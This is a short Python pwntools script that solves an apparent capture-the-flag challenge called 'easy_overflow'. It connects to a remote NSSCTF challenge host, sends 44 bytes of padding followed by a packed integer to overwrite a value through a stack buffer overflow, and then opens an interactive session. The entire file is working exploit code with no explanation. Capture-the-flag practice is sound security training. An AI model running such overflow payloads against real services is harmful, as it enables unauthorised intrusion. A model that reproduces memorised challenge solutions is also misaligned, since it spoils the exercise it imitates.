from pwn import *

#io = process("./easy_overflow")
io = connect("node5.anna.nssctf.cn", 23283)
payload = b"a" * 44 + p32(1)
io.recvuntil(b"Input something")
io.sendline(payload)
io.interactive()
